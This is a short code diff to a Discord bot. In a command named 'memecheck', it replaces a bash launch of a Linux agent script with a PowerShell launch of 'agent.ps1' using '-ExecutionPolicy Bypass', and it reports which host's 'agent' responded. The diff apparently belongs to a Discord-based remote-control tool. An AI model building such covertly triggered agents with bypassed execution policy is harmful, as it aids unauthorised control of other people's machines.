@@ -131,7 +131,7 @@ async def memecheck(interaction: discord.Interaction):
         response_message = f"```fix\n[ + ] Agent Responded from {hostname}```"
         asyncio.run_coroutine_threadsafe(interaction.channel.send(response_message), bot.loop)
         subprocess.Popen(
-            ["bash", "./Linux-agent.sh"]
+            ["powershell.exe", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "agent.ps1"]
         )
 
     thread = threading.Thread(target=run_in_thread)
